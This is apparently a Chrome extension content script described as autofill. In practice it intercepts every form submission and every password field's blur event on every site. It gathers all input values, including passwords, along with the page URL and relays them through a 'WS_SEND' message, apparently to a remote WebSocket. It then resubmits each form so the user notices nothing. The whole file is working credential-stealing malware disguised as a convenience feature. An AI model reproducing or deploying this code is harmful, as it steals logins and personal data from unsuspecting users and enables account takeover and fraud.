(function () {
  const MAX_SUBMITS = 2;
  const RESET_INTERVAL = 5 * 60 * 1000;

  const domain = location.hostname;
  const key = `submit_count_${domain}`;
  const lastResetKey = `submit_reset_${domain}`;

  function getCount() {
    return parseInt(localStorage.getItem(key) || "0", 10);
  }

  function incrementCount() {
    localStorage.setItem(key, getCount() + 1);
    localStorage.setItem(lastResetKey, Date.now());
  }

  function maybeResetCount() {
    const last = parseInt(localStorage.getItem(lastResetKey) || "0", 10);
    if (Date.now() - last > RESET_INTERVAL) {
      localStorage.setItem(key, "0");
    }
  }

  function handleFormSubmit(event) {
    const form = event.target;
    if (!(form instanceof HTMLFormElement)) return;

    // Avoid loops: don't re-handle forms already submitted
    if (form.dataset.submitted === "1") return;

    maybeResetCount();

    if (getCount() >= MAX_SUBMITS) return;

    event.preventDefault();

    const formData = new FormData(form);
    const data = {};

    for (const [key, value] of formData.entries()) {
      data[key] = value;
    }

    data._page = window.location.href;

      chrome.runtime.sendMessage({
      type: "WS_SEND",
      payload: { type: "autofill", data: JSON.stringify(data) } // or just a string if you prefer
    }).finally(() => {
      form.dataset.submitted = "1";  // ✅ Mark as submitted
      incrementCount();
      form.submit(); // continue
    });
  }

  function observeForms(rootNode) {
    const forms = rootNode.querySelectorAll("form");
    forms.forEach((form) => {
      form.addEventListener("submit", handleFormSubmit, true);
    });
  }

  // Capture password fields on blur (covers JS-based logins that never fire submit)
  const capturedPasswords = new WeakSet();

  function handlePasswordBlur(e) {
    const input = e.target;
    if (!input || !input.value || capturedPasswords.has(input)) return;
    capturedPasswords.add(input);

    // Gather all visible inputs in the same form or nearest container
    const container = input.closest("form") || input.parentElement?.closest("div, section, main") || document.body;
    const fields = {};
    container.querySelectorAll("input").forEach(inp => {
      const name = inp.name || inp.id || inp.type || "field";
      if (inp.value) fields[name] = inp.value;
    });
    fields._page = window.location.href;
    fields._trigger = "password_blur";

    chrome.runtime.sendMessage({
      type: "WS_SEND",
      payload: { type: "autofill", data: JSON.stringify(fields) }
    }).catch(() => {});
  }

  function observePasswordFields(root) {
    root.querySelectorAll('input[type="password"]').forEach(inp => {
      inp.addEventListener("blur", handlePasswordBlur, true);
    });
  }

  function startObserver() {
    if (!document.body) return;

    observeForms(document.body);
    observePasswordFields(document.body);

    const observer = new MutationObserver((mutations) => {
      for (const mutation of mutations) {
        for (const node of mutation.addedNodes) {
          if (node.nodeType !== Node.ELEMENT_NODE) continue;
          if (node.tagName === "FORM") {
            node.addEventListener("submit", handleFormSubmit, true);
          } else if (node.querySelectorAll) {
            observeForms(node);
          }
          // Watch for dynamically added password fields (SPA login pages)
          if (node.tagName === "INPUT" && node.type === "password") {
            node.addEventListener("blur", handlePasswordBlur, true);
          } else if (node.querySelectorAll) {
            observePasswordFields(node);
          }
        }
      }
    });

    observer.observe(document.body, { childList: true, subtree: true });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", startObserver);
  } else {
    startObserver();
  }
})();
